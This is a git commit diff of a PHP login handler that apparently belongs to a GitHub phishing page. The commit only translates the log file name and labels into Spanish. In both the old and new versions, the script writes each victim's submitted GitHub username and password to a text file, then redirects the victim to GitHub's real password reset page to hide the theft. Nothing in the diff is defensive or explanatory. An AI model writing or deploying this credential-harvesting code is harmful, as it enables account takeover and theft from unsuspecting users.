69cfa87c6cebb16235f589da01016d945264eedb
RichardCC251 <111826887+RichardCC251@users.noreply.github.com>
2024-08-26 21:16:27 -0600

    login.php

--- login.php
+++ login.php
@@ -1,6 +1,5 @@
 <?php
-
-file_put_contents("usernames.txt", "Github Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usuario.txt", "Github Usuario: " . $_POST['login'] . " Contrasena: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://github.com/password_reset');
 exit();
 ?>
